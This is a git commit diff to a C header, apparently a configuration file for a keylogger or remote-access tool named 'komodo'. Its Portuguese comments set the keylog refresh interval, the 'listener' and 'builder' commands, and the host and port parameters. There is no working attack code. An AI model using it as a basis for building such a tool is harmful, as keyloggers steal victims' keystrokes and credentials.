039d0181661b539bab8439cd4924a135c53d0853
Vinícius Pelatieri de Moraes <153043131+Vinicius-P-Moraes@users.noreply.github.com>
2024-03-24 01:21:20 -0300

    Update komodo_config.h

--- src/headers/komodo_config.h
+++ src/headers/komodo_config.h
@@ -6,8 +6,39 @@
 #########################################
 */
 
-//Tempo para atualizar o keylogger em segundos
-const int klog_update_time = 2;
 
-//tamanho máximo para o comando digitado pelo user:
-const int command_size = 100;
+/*CONFIGURAÇÕES DO KEY LOGGER*/
+
+  //Tempo para atualizar o keylogger em segundos:
+  const int klog_update_time = 2;
+
+/*FIM DAS CONFIGURAÇÕES DO KEY LOGGER*/
+
+
+/*CONFIGURAÇÔES DO INTERPRETADOR DE COMANDOS*/
+
+  /*COMANDOS*/
+
+    //Tamanho máximo para o comando digitado pelo user:
+    const int command_size = 100;
+
+    //Comando para iniciar o listener:
+    const char* listener_identifyer = "listener";
+
+    //Comando oara iniciar o builder:
+    const char* builder_identifyer = "builder";
+
+  /*FIM DE COMANDOS*/
+
+
+  /*PARÂMETROS*/
+
+      //Parâmetro para identificar o IP/DNS:
+      const char* ip_param_identifyer = "host";
+
+      //Parâmetro para identificar a porta:
+      const char* port_param_identifyer = "port";
+  /*FIM DE PARÂMETROS*/
+
+/*FIM DAS CONFIGURAÇÔES DO INTERPRETADOR DE COMANDOS*/
+
